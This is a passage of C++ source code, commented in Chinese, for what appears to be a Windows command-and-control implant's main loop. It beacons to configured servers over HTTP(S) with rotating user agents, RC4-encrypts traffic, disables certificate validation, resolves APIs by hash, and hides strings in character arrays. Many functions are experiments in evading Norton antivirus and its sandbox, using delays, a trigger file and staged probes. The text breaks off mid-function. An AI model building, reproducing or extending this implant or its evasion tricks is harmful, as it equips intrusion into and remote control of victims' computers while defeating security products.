// 文件作用：Windows agent 主循环：初始化 API、创建 agent/connector，循环 check-in、取任务、回传结果。
#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "Encoders.h"
#include "WaitMask.h"
#include "Connector.h"
#include "ConnectorHTTP.h"
#include "config.h"

#ifndef DIRECT_HTTPS_PROBE_STAGE
#define DIRECT_HTTPS_PROBE_STAGE -1
#endif

#ifndef DIRECT_HTTPS_SANDBOX_PROBE_STAGE
#define DIRECT_HTTPS_SANDBOX_PROBE_STAGE -1
#endif

#ifndef DIRECT_HTTPS_DELAY_BEFORE_SEND_MS
#define DIRECT_HTTPS_DELAY_BEFORE_SEND_MS 0
#endif

#ifndef DIRECT_HTTPS_REQUIRE_TRIGGER_FILE
#define DIRECT_HTTPS_REQUIRE_TRIGGER_FILE 0
#endif

#ifndef DIRECT_HTTPS_EXIT_BEFORE_SEND
#define DIRECT_HTTPS_EXIT_BEFORE_SEND 0
#endif

#ifndef DIRECT_HTTPS_CAPTURE_PORT_8001
#define DIRECT_HTTPS_CAPTURE_PORT_8001 0
#endif

#ifndef DIRECT_HTTPS_MEMORY_LOADER_DIAG
#define DIRECT_HTTPS_MEMORY_LOADER_DIAG 0
#endif

#ifndef DIRECT_HTTPS_FAST_FIRST_LOOPS
#define DIRECT_HTTPS_FAST_FIRST_LOOPS 0
#endif

#ifndef DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS
#define DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS 0
#endif

#ifndef DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS
#define DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS 0
#endif

#ifndef DIRECT_HTTPS_HEARTBEAT_ONLY
#define DIRECT_HTTPS_HEARTBEAT_ONLY 0
#endif

#ifndef DIRECT_HTTPS_HELLO_ONLY
#define DIRECT_HTTPS_HELLO_ONLY 0
#endif

#ifndef DIRECT_HTTPS_LITE_CONNECTOR
#define DIRECT_HTTPS_LITE_CONNECTOR 0
#endif

#ifndef DIRECT_HTTPS_TRIGGER_FILE_PATH
#define DIRECT_HTTPS_TRIGGER_FILE_PATH "C:\\Users\\Public\\norton_trigger.txt"
#endif

#ifndef DIRECT_HTTPS_PROBE_HOST
#define DIRECT_HTTPS_PROBE_HOST "127.0.0.1"
#endif

Agent* g_Agent;
Connector* g_Connector;

#if DIRECT_HTTPS_LITE_CONNECTOR
// ConnectorLite keeps the Connector contract but delays all network state until
// the first Exchange call.  The normal ConnectorHTTP implementation remains
// available for builds that need its probe surface.
class ConnectorLite final : public Connector
{
	ProfileHTTP profile = {};
	HTTPFUNC* functions = NULL;
	HMODULE wininet = NULL;
	HINTERNET internet = NULL;
	HINTERNET connect = NULL;
	CHAR* headers = NULL;
	BYTE* recvData = NULL;
	int recvSize = 0;
	ULONG serverIndex = 0;
	ULONG uriIndex = 0;
	ULONG uaIndex = 0;
	ULONG hostIndex = 0;

	BOOL EnsureNetwork();
	void SendData(BYTE* data, ULONG dataSize);

public:
	ConnectorLite() {}

	static void* operator new(size_t sz)
	{
		return MemAllocLocal((DWORD)sz);
	}

	static void operator delete(void* p) noexcept
	{
		MemFreeLocal(&p, sizeof(ConnectorLite));
	}

	BOOL SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void CloseConnector() override;
	BYTE* RecvData() override;
	int RecvSize() override;
	void RecvClear() override;
	DWORD ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000);
};

BOOL ConnectorLite::EnsureNetwork()
{
	if (!this->functions) {
		this->functions = (HTTPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));
		if (!this->functions)
			return FALSE;
		this->functions->LocalAlloc = ApiWin->LocalAlloc;
		this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
		this->functions->LocalFree = ApiWin->LocalFree;
		this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
		this->functions->GetProcAddress = ApiWin->GetProcAddress;
		this->functions->GetLastError = ApiWin->GetLastError;
	}

	if (!this->wininet) {
		CHAR name[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };
		this->wininet = ApiWin->LoadLibraryA(name);
	}
	if (!this->wininet)
		return FALSE;

#if DIRECT_HTTPS_NO_API_HASHING
	this->functions->InternetOpenA = (decltype(InternetOpenA)*)ApiWin->GetProcAddress(this->wininet, "InternetOpenA");
	this->functions->InternetConnectA = (decltype(InternetConnectA)*)ApiWin->GetProcAddress(this->wininet, "InternetConnectA");
	this->functions->HttpOpenRequestA = (decltype(HttpOpenRequestA)*)ApiWin->GetProcAddress(this->wininet, "HttpOpenRequestA");
	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)ApiWin->GetProcAddress(this->wininet, "HttpSendRequestA");
	this->functions->InternetSetOptionA = (decltype(InternetSetOptionA)*)ApiWin->GetProcAddress(this->wininet, "InternetSetOptionA");
	this->functions->InternetQueryOptionA = (decltype(InternetQueryOptionA)*)ApiWin->GetProcAddress(this->wininet, "InternetQueryOptionA");
	this->functions->HttpQueryInfoA = (decltype(HttpQueryInfoA)*)ApiWin->GetProcAddress(this->wininet, "HttpQueryInfoA");
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)ApiWin->GetProcAddress(this->wininet, "InternetQueryDataAvailable");
	this->functions->InternetCloseHandle = (decltype(InternetCloseHandle)*)ApiWin->GetProcAddress(this->wininet, "InternetCloseHandle");
	this->functions->InternetReadFile = (decltype(InternetReadFile)*)ApiWin->GetProcAddress(this->wininet, "InternetReadFile");
#else
	this->functions->InternetOpenA = (decltype(InternetOpenA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETOPENA);
	this->functions->InternetConnectA = (decltype(InternetConnectA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETCONNECTA);
	this->functions->HttpOpenRequestA = (decltype(HttpOpenRequestA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPOPENREQUESTA);
	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPSENDREQUESTA);
	this->functions->InternetSetOptionA = (decltype(InternetSetOptionA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETSETOPTIONA);
	this->functions->InternetQueryOptionA = (decltype(InternetQueryOptionA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETQUERYOPTIONA);
	this->functions->HttpQueryInfoA = (decltype(HttpQueryInfoA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPQUERYINFOA);
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
	this->functions->InternetCloseHandle = (decltype(InternetCloseHandle)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETCLOSEHANDLE);
	this->functions->InternetReadFile = (decltype(InternetReadFile)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETREADFILE);
#endif

	return this->functions->InternetOpenA && this->functions->InternetConnectA &&
		this->functions->HttpOpenRequestA && this->functions->HttpSendRequestA &&
		this->functions->InternetCloseHandle && this->functions->InternetReadFile;
}

BOOL ConnectorLite::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	if (!profilePtr || !beat || !beatSize)
		return FALSE;

	ProfileHTTP incoming = *(ProfileHTTP*)profilePtr;
	CHAR* encoded = b64_encode(beat, (int)beatSize);
	if (!encoded)
		return FALSE;

	ULONG baseLen = incoming.http_headers ? StrLenA((CHAR*)incoming.http_headers) : 0;
	ULONG nameLen = incoming.parameter ? StrLenA((CHAR*)incoming.parameter) : 0;
	ULONG encLen = StrLenA(encoded);
	CHAR closeHeader[] = { 'C','o','n','n','e','c','t','i','o','n',':',' ','c','l','o','s','e','\r','\n',0 };
	ULONG closeLen = StrLenA(closeHeader);
	ULONG total = baseLen + nameLen + encLen + closeLen + 5;
	CHAR* nextHeaders = (CHAR*)ApiWin->LocalAlloc(LPTR, total);
	if (!nextHeaders) {
		ApiWin->LocalFree(encoded);
		return FALSE;
	}

	ULONG at = 0;
	if (baseLen) {
		memcpy(nextHeaders + at, incoming.http_headers, baseLen);
		at += baseLen;
	}
	if (nameLen) {
		memcpy(nextHeaders + at, incoming.parameter, nameLen);
		at += nameLen;
	}
	nextHeaders[at++] = ':';
	nextHeaders[at++] = ' ';
	memcpy(nextHeaders + at, encoded, encLen);
	at += encLen;
	nextHeaders[at++] = '\r';
	nextHeaders[at++] = '\n';
	memcpy(nextHeaders + at, closeHeader, closeLen);
	at += closeLen;
	nextHeaders[at] = 0;

	ApiWin->LocalFree(encoded);
	if (this->headers)
		ApiWin->LocalFree(this->headers);
	this->headers = nextHeaders;
	this->profile = incoming;
	return TRUE;
}

void ConnectorLite::SendData(BYTE* data, ULONG dataSize)
{
	this->recvSize = 0;
	if (!this->EnsureNetwork() || !this->profile.servers_count || !this->profile.uri_count)
		return;

	if (this->connect) {
		this->functions->InternetCloseHandle(this->connect);
		this->connect = NULL;
	}
	if (this->internet) {
		this->functions->InternetCloseHandle(this->internet);
		this->internet = NULL;
	}

	CHAR fallbackUA[] = { 'M','o','z','i','l','l','a','/','5','.','0',0 };
	CHAR* ua = fallbackUA;
	if (this->profile.ua_count && this->profile.user_agents)
		ua = (CHAR*)this->profile.user_agents[this->uaIndex % this->profile.ua_count];
	CHAR* server = (CHAR*)this->profile.servers[this->serverIndex % this->profile.servers_count];
	CHAR* uri = (CHAR*)this->profile.uris[this->uriIndex % this->profile.uri_count];

	this->internet = this->functions->InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!this->internet)
		return;
	DWORD context = 0;
	this->connect = this->functions->InternetConnectA(this->internet, server,
		this->profile.ports[this->serverIndex % this->profile.servers_count], NULL, NULL,
		INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
	if (!this->connect)
		return;

	CHAR accept[] = { '*','/','*',0 };
	LPCSTR accepts[] = { accept, NULL };
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
	if (this->profile.use_ssl)
		flags |= INTERNET_FLAG_SECURE;
	HINTERNET request = this->functions->HttpOpenRequestA(this->connect,
		(CHAR*)this->profile.http_method, uri, NULL, NULL, accepts, flags, (DWORD_PTR)&context);
	if (!request)
		return;

	if (this->profile.use_ssl && this->functions->InternetQueryOptionA && this->functions->InternetSetOptionA) {
		DWORD security = 0;
		DWORD securityLen = sizeof(security);
		if (!this->functions->InternetQueryOptionA(request, INTERNET_OPTION_SECURITY_FLAGS, &security, &securityLen))
			security = 0;
		security |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION |
			SECURITY_FLAG_IGNORE_WRONG_USAGE;
		this->functions->InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS, &security, sizeof(security));
	}

	BOOL sent = this->functions->HttpSendRequestA(request, this->headers,
		(DWORD)StrLenA(this->headers), data, (DWORD)dataSize);
	if (sent && this->functions->InternetQueryDataAvailable) {
		BYTE* buffer = NULL;
		ULONG total = 0;
		for (;;) {
			DWORD available = 0;
			if (!this->functions->InternetQueryDataAvailable(request, &available, 0, 0) || !available)
				break;
			BYTE* grown = buffer ? (BYTE*)this->functions->LocalReAlloc(buffer, total + available, LMEM_MOVEABLE) :
				(BYTE*)this->functions->LocalAlloc(LPTR, available);
			if (!grown)
				break;
			buffer = grown;
			DWORD read = 0;
			if (!this->functions->InternetReadFile(request, buffer + total, available, &read) || !read)
				break;
			total += read;
		}
		if (total) {
			this->recvData = buffer;
			this->recvSize = (int)total;
		}
		else if (buffer) {
			this->functions->LocalFree(buffer);
		}
	}

	this->functions->InternetCloseHandle(request);
	this->functions->InternetCloseHandle(this->connect);
	this->functions->InternetCloseHandle(this->internet);
	this->connect = NULL;
	this->internet = NULL;
	this->serverIndex = (this->serverIndex + 1) % this->profile.servers_count;
	this->uriIndex = (this->uriIndex + 1) % this->profile.uri_count;
	if (this->profile.ua_count)
		this->uaIndex = (this->uaIndex + 1) % this->profile.ua_count;
}

void ConnectorLite::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize)
		EncryptRC4(plainData, plainSize, sessionKey, 16);
	this->SendData(plainData, plainSize);
	if (this->recvData && this->RecvSize() > 0)
		DecryptRC4(this->RecvData(), this->RecvSize(), sessionKey, 16);
}

BYTE* ConnectorLite::RecvData()
{
	return this->recvData ? this->recvData + this->profile.ans_pre_size : NULL;
}

int ConnectorLite::RecvSize()
{
	if (this->recvSize < (int)this->profile.ans_size)
		return 0;
	return this->recvSize - (int)this->profile.ans_size;
}

void ConnectorLite::RecvClear()
{
	if (this->recvData) {
		MemFreeLocal((LPVOID*)&this->recvData, (DWORD)this->recvSize);
		this->recvSize = 0;
	}
}

void ConnectorLite::CloseConnector()
{
	if (this->connect && this->functions)
		this->functions->InternetCloseHandle(this->connect);
	if (this->internet && this->functions)
		this->functions->InternetCloseHandle(this->internet);
	this->connect = NULL;
	this->internet = NULL;
	if (this->headers)
		ApiWin->LocalFree(this->headers);
	this->headers = NULL;
	if (this->recvData)
		this->RecvClear();
	if (this->functions)
		ApiWin->LocalFree(this->functions);
	this->functions = NULL;
}

DWORD ConnectorLite::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
{
	(void)stage;
	(void)forcePlainHttp8000;
	return 1599;
}
#endif

static ULONG ReadBE32(const BYTE* data)
{
	return (((ULONG)data[0]) << 24) | (((ULONG)data[1]) << 16) | (((ULONG)data[2]) << 8) | ((ULONG)data[3]);
}

// Result envelope schema4：LPR4 | schema/be32 | flags/be32 | body_len/be32 | sectioned_body。
// sectioned_body 使用自研 result bundle section，显式声明 codec/flags/payload_len。
static VOID InitResultEnvelope(Packer* packer, ULONG codec)
{
	if (!packer)
		return;
	BYTE magic[4] = { 'L', 'P', 'R', '4' };
	packer->PackFlatBytes(magic, 4);
	packer->Pack32(DIRECT_HTTPS_RESULTS_V2_SCHEMA);
	packer->Pack32(DIRECT_HTTPS_ENVELOPE_FLAG_SECTIONED);
	packer->Pack32(0);
	packer->Pack32(2);
	packer->Pack32(DIRECT_HTTPS_SECTION_META);
	packer->Pack32(16);
	packer->Pack32(4);
	packer->Pack32(DIRECT_HTTPS_SECTION_CAPABILITIES);
	packer->Pack32(SELF_C2_RESULT_BUNDLE_V4_SCHEMA);
	packer->Pack32(0);
	packer->Pack32(SELF_C2_SECTION_RESULT_BUNDLE_V4);
	packer->Pack32(0);
	packer->Pack32(SELF_C2_RESULT_BUNDLE_V4_SCHEMA);
	packer->Pack32(codec);
	packer->Pack32(0);
	packer->Pack32(0);
}

static BOOL HasResultRecords(Packer* packer)
{
	return packer && packer->datasize() > SELF_C2_RESULTS_V4_RECORD_OFFSET;
}

static VOID FinalizeResultEnvelope(Packer* packer)
{
	if (!packer || packer->datasize() < SELF_C2_RESULTS_V4_RECORD_OFFSET)
		return;
	ULONG payloadLen = packer->datasize() - SELF_C2_RESULTS_V4_RECORD_OFFSET;
	packer->Set32(DIRECT_HTTPS_RESULTS_V2_BODY_OFFSET, packer->datasize() - DIRECT_HTTPS_RESULTS_V2_HEADER_SIZE);
	packer->Set32(SELF_C2_RESULTS_V4_BUNDLE_SECTION_LEN_OFFSET, payloadLen + 16);
	packer->Set32(SELF_C2_RESULTS_V4_BUNDLE_PAYLOAD_LEN_OFFSET, payloadLen);
}

static BOOL TryRewriteCompatPayloadToNativeCodec(Packer* packer)
{
	if (!packer || packer->datasize() <= SELF_C2_RESULTS_V4_RECORD_OFFSET)
		return FALSE;

	PBYTE payload = packer->data() + SELF_C2_RESULTS_V4_RECORD_OFFSET;
	ULONG payloadLen = packer->datasize() - SELF_C2_RESULTS_V4_RECORD_OFFSET;
	if (payloadLen < 12)
		return FALSE;

	ULONG taskId = ReadBE32(payload);
	ULONG commandId = ReadBE32(payload + 4);
	ULONG fieldLen = ReadBE32(payload + 8);
	if (payloadLen != 12 + fieldLen)
		return FALSE;

	ULONG actionId = 0;
	ULONG fieldType = 0;
	switch (commandId) {
	case COMMAND_HELLO:
		actionId = SELF_C2_ACTION_HELLO;
		fieldType = SELF_C2_NATIVE_RESULT_FIELD_TEXT;
		break;
	case COMMAND_PWD:
		actionId = SELF_C2_ACTION_PWD;
		fieldType = SELF_C2_NATIVE_RESULT_FIELD_PATH;
		break;
	default:
		return FALSE;
	}

	Packer* rewritten = new Packer();
	InitResultEnvelope(rewritten, SELF_C2_RESULT_CODEC_NATIVE_FIELDS);
	rewritten->Pack32(1);
	rewritten->Pack32(SELF_C2_NATIVE_RESULT_RECORD_V4_SCHEMA);
	rewritten->Pack32(taskId);
	rewritten->Pack32(actionId);
	rewritten->Pack32(fieldType);
	rewritten->Pack32(fieldLen);
	if (fieldLen > 0)
		rewritten->PackFlatBytes(payload + 12, fieldLen);

	packer->Clear(TRUE);
	packer->PackFlatBytes(rewritten->data(), rewritten->datasize());
	delete rewritten;
	return TRUE;
}

#if DIRECT_HTTPS_MEMORY_LOADER_DIAG
// MemoryDiagLog 把 AgentMain 内部阶段追加到 loader 同一个日志文件。
// 小白理解：loader 已经把日志路径放进 MMPP_LOADER_LOG 环境变量；这里直接读这个变量，
// 所以可以看到“DLL 已经进 RunAgentDll 以后，agent 主循环到底走到了哪一步”。
static void MemoryDiagLog(LPCSTR text)
{
	CHAR path[MAX_PATH] = { 0 };
	DWORD n = GetEnvironmentVariableA("MMPP_LOADER_LOG", path, sizeof(path));
	if (!n || n >= sizeof(path) || !text)
		return;
	HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return;
	DWORD written = 0;
	WriteFile(h, text, StrLenA((CHAR*)text), &written, NULL);
	WriteFile(h, "\r\n", 2, &written, NULL);
	CloseHandle(h);
}

// MemoryDiagLogU32 记录一个无符号整数，例如 recvSize、datasize、exit_method。
static void MemoryDiagLogU32(LPCSTR prefix, ULONG value)
{
	CHAR buf[96] = { 0 };
	ULONG off = 0;
	if (prefix) {
		while (prefix[off] && off < sizeof(buf) - 1) {
			buf[off] = prefix[off];
			off++;
		}
	}
	CHAR digits[16] = { 0 };
	ULONG d = 0;
	if (value == 0) {
		digits[d++] = '0';
	}
	else {
		while (value && d < sizeof(digits)) {
			digits[d++] = (CHAR)('0' + (value % 10));
			value /= 10;
		}
	}
	while (d && off < sizeof(buf) - 1) {
		buf[off++] = digits[--d];
	}
	buf[off] = 0;
	MemoryDiagLog(buf);
}
#else
// Compile diagnostic calls out entirely in production builds.  A no-op
// function would still retain each call's string literal in the DLL.
#define MemoryDiagLog(...) ((void)0)
#define MemoryDiagLogU32(...) ((void)0)
#endif

// CreateConnector 创建当前使用的通信连接器，这里固定为 HTTP/HTTPS。
static Connector* CreateConnector()
{
	#if DIRECT_HTTPS_LITE_CONNECTOR
	return new ConnectorLite();
	#else
	return new ConnectorHTTP();
	#endif
}

// ProbeSleepReturn 是 AV 定位实验用的辅助函数：sleep 一会儿再返回指定退出码。
static DWORD ProbeSleepReturn(DWORD code)
{
	if (ApiWin && ApiWin->Sleep)
		ApiWin->Sleep(10000);
	else
		::Sleep(10000);
	return code;
}

// ProbeWininetRequest 是 AV 定位实验用的辅助函数：单独测试 WinINet HTTP/HTTPS 请求。
static DWORD ProbeWininetRequest(BOOL ssl, WORD port, LPCSTR uri, DWORD code)
{
	HMODULE hWininet = ApiWin->LoadLibraryA("wininet.dll");
	if (!hWininet)
		return code + 100;

	decltype(InternetOpenA)*              pInternetOpenA              = (decltype(InternetOpenA)*)              ApiWin->GetProcAddress(hWininet, "InternetOpenA");
	decltype(InternetConnectA)*           pInternetConnectA           = (decltype(InternetConnectA)*)           ApiWin->GetProcAddress(hWininet, "InternetConnectA");
	decltype(HttpOpenRequestA)*           pHttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           ApiWin->GetProcAddress(hWininet, "HttpOpenRequestA");
	decltype(HttpSendRequestA)*           pHttpSendRequestA           = (decltype(HttpSendRequestA)*)           ApiWin->GetProcAddress(hWininet, "HttpSendRequestA");
	decltype(InternetSetOptionA)*         pInternetSetOptionA         = (decltype(InternetSetOptionA)*)         ApiWin->GetProcAddress(hWininet, "InternetSetOptionA");
	decltype(InternetQueryOptionA)*       pInternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       ApiWin->GetProcAddress(hWininet, "InternetQueryOptionA");
	decltype(InternetCloseHandle)*        pInternetCloseHandle        = (decltype(InternetCloseHandle)*)        ApiWin->GetProcAddress(hWininet, "InternetCloseHandle");
	decltype(InternetQueryDataAvailable)* pInternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) ApiWin->GetProcAddress(hWininet, "InternetQueryDataAvailable");
	decltype(InternetReadFile)*           pInternetReadFile           = (decltype(InternetReadFile)*)           ApiWin->GetProcAddress(hWininet, "InternetReadFile");

	if (!pInternetOpenA || !pInternetConnectA || !pHttpOpenRequestA || !pHttpSendRequestA || !pInternetCloseHandle)
		return code + 101;

	HINTERNET hInternet = pInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet)
		return code + 102;

	HINTERNET hConnect = pInternetConnectA(hInternet, DIRECT_HTTPS_PROBE_HOST, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		pInternetCloseHandle(hInternet);
		return code + 103;
	}

	CHAR acceptTypes[] = { '*', '/', '*', 0 };
	LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
	if (ssl)
		flags |= INTERNET_FLAG_SECURE;

	HINTERNET hRequest = pHttpOpenRequestA(hConnect, "GET", uri, 0, 0, rgpszAcceptTypes, flags, 0);
	if (!hRequest) {
		pInternetCloseHandle(hConnect);
		pInternetCloseHandle(hInternet);
		return code + 104;
	}

	if (ssl && pInternetQueryOptionA && pInternetSetOptionA) {
		DWORD dwFlags = 0;
		DWORD dwBuffer = sizeof(DWORD);
		if (!pInternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer))
			dwFlags = 0;
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
		pInternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	CHAR headers[] = { 'X','-','V','1','3','-','P','r','o','b','e',':',' ','1','\r','\n',0 };
	BOOL sent = pHttpSendRequestA(hRequest, headers, StrLenA(headers), NULL, 0);

	if (sent && pInternetQueryDataAvailable && pInternetReadFile) {
		DWORD available = 0;
		if (pInternetQueryDataAvailable(hRequest, &available, 0, 0) && available > 0) {
			BYTE buffer[128];
			DWORD readed = 0;
			pInternetReadFile(hRequest, buffer, sizeof(buffer), &readed);
		}
	}

	pInternetCloseHandle(hRequest);
	pInternetCloseHandle(hConnect);
	pInternetCloseHandle(hInternet);

	if (!sent)
		return code + 105;

	return ProbeSleepReturn(code);
}

// SandboxProbeSleepMs 是 Norton 内部沙箱实验用的 sleep 包装：
// ApiLoad 之前走系统 Sleep，ApiLoad 之后优先走 ApiWin->Sleep。
static void SandboxProbeSleepMs(DWORD ms)
{
	if (ApiWin && ApiWin->Sleep)
		ApiWin->Sleep(ms);
	else
		::Sleep(ms);
}

// Delay only the first check-in in the learning build. Subsequent heartbeat
// timing remains controlled by the profile sleep/jitter values.
static void InitialCheckinDelay()
{
#if DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS > 0 && DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS >= DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS
	ULONG span = (ULONG)(DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS - DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS + 1);
	ULONG delay = (ULONG)DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS;
	if (span > 1)
		delay += GenerateRandom32() % span;
	SandboxProbeSleepMs(delay);
#endif
}

// SandboxLoadWininetNoSend 只加载 wininet.dll 并解析几个网络 API，不真正发送请求。
// 用来区分“API 初始化/解析”与“真实网络发送”哪个才是 Norton 触发边界。
static DWORD SandboxLoadWininetNoSend(DWORD successCode)
{
	HMODULE hWininet = ApiWin->LoadLibraryA("wininet.dll");
	if (!hWininet)
		return successCode + 1000;

	volatile void* pInternetOpenA    = ApiWin->GetProcAddress(hWininet, "InternetOpenA");
	volatile void* pInternetConnectA = ApiWin->GetProcAddress(hWininet, "InternetConnectA");
	volatile void* pHttpOpenRequestA = ApiWin->GetProcAddress(hWininet, "HttpOpenRequestA");
	volatile void* pHttpSendRequestA = ApiWin->GetProcAddress(hWininet, "HttpSendRequestA");

	if (!pInternetOpenA || !pInternetConnectA || !pHttpOpenRequestA || !pHttpSendRequestA)
		return successCode + 1001;

	SandboxProbeSleepMs(DIRECT_HTTPS_DELAY_BEFORE_SEND_MS ? DIRECT_HTTPS_DELAY_BEFORE_SEND_MS : 60000);
	return successCode;
}

// SandboxTriggerFileExists 检查人工触发文件是否存在。
// 沙箱通常不会知道实验者之后才创建的文件，用它验证“需要外部触发的路径”是否会被自动探索。
static BOOL SandboxTriggerFileExists()
{
	if (!ApiWin || !ApiWin->GetFileAttributesA)
		return FALSE;
	DWORD attr = ApiWin->GetFileAttributesA(DIRECT_HTTPS_TRIGGER_FILE_PATH);
	return attr != INVALID_FILE_ATTRIBUTES;
}

// SandboxWaitForTriggerFile 最多等待 totalMs 毫秒，期间每秒检查一次触发文件。
static BOOL SandboxWaitForTriggerFile(DWORD totalMs)
{
	DWORD waited = 0;
	while (waited < totalMs) {
		if (SandboxTriggerFileExists())
			return TRUE;
		SandboxProbeSleepMs(1000);
		waited += 1000;
	}
	return SandboxTriggerFileExists();
}

// SandboxHttpSend8001 向 Linux 侧 request capture server 发送一个请求，但不读取响应。
// 这个函数只服务于 V56-V61：用 8001 抓原始 HTTP 请求，判断 Norton 是发送前处理还是发送后处理。
static DWORD SandboxHttpSend8001(LPCSTR method, LPCSTR uri, LPCSTR headers, LPVOID body, DWORD bodySize, DWORD successCode)
{
	HMODULE hWininet = ApiWin->LoadLibraryA("wininet.dll");
	if (!hWininet)
		return successCode + 1000;

	decltype(InternetOpenA)*        pInternetOpenA        = (decltype(InternetOpenA)*)        ApiWin->GetProcAddress(hWininet, "InternetOpenA");
	decltype(InternetConnectA)*     pInternetConnectA     = (decltype(InternetConnectA)*)     ApiWin->GetProcAddress(hWininet, "InternetConnectA");
	decltype(HttpOpenRequestA)*     pHttpOpenRequestA     = (decltype(HttpOpenRequestA)*)     ApiWin->GetProcAddress(hWininet, "HttpOpenRequestA");
	decltype(HttpSendRequestA)*     pHttpSendRequestA     = (decltype(HttpSendRequestA)*)     ApiWin->GetProcAddress(hWininet, "HttpSendRequestA");
	decltype(InternetCloseHandle)*  pInternetCloseHandle  = (decltype(InternetCloseHandle)*)  ApiWin->GetProcAddress(hWininet, "InternetCloseHandle");

	if (!pInternetOpenA || !pInternetConnectA || !pHttpOpenRequestA || !pHttpSendRequestA || !pInternetCloseHandle)
		return successCode + 1001;

	CHAR ua[] = {
		'M','o','z','i','l','l','a','/','5','.','0',' ',
		'(','W','i','n','d','o','w','s',' ','N','T',' ','1','0','.','0',';',
		' ','W','i','n','6','4',';',' ','x','6','4',')',0
	};
	HINTERNET hInternet = pInternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet)
		return successCode + 1002;

	HINTERNET hConnect = pInternetConnectA(hInternet, DIRECT_HTTPS_PROBE_HOST, 8001, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		pInternetCloseHandle(hInternet);
		return successCode + 1003;
	}

	CHAR acceptTypes[] = { '*', '/', '*', 0 };
	LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
	HINTERNET hRequest = pHttpOpenRequestA(hConnect, method, uri, 0, 0, rgpszAcceptTypes, flags, 0);
	if (!hRequest) {
		pInternetCloseHandle(hConnect);
		pInternetCloseHandle(hInternet);
		return successCode + 1004;
	}

	BOOL sent = pHttpSendRequestA(hRequest, headers, headers ? (DWORD)StrLenA((CHAR*)headers) : 0, body, bodySize);

	pInternetCloseHandle(hRequest);
	pInternetCloseHandle(hConnect);
	pInternetCloseHandle(hInternet);

	if (!sent)
		return successCode + 1005;

	SandboxProbeSleepMs(10000);
	return successCode;
}

// SandboxProfileUriOnly 只使用 listener profile 中的 URI 和 HTTP method，其余 header 保持普通。
static DWORD SandboxProfileUriOnly(DWORD successCode)
{
	AgentConfig* probeConfig = new AgentConfig();
	if (!probeConfig || !probeConfig->profile.uris || !probeConfig->profile.uri_count)
